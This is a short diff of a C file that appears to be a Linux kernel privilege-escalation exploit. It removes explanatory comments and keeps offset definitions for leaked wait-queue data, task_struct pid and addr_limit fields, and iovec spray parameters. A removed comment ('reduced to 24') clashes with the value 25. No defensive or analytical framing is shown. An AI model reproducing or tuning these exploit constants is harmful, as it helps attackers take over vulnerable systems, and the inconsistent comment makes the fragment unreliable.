@@ -6,18 +6,12 @@
 #include <stdint.h>
 #include <sys/types.h>
 
-// --- CORRECTED OFFSETS FOR x86_64 ---
-// Leak Source: wait.head (0xA8)
-// Leak Target: task (0x190)
-// Offset: 0x190 - 0xA8 = 0xE8
 #define TASK_STRUCT_OFFSET_IN_LEAKED_DATA 0xE8
 #define OFFSET_TASK_STRUCT_PID 0x4E8
 #define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18
-// ------------------------------------
 
 #define PAGE_SIZE 4096
 
-// Reduced to 24 to ensure we don't accidentally overwrite 'task' at offset 400
 #define IOVEC_COUNT 25
 #define IOVEC_WQ_INDEX 10
 
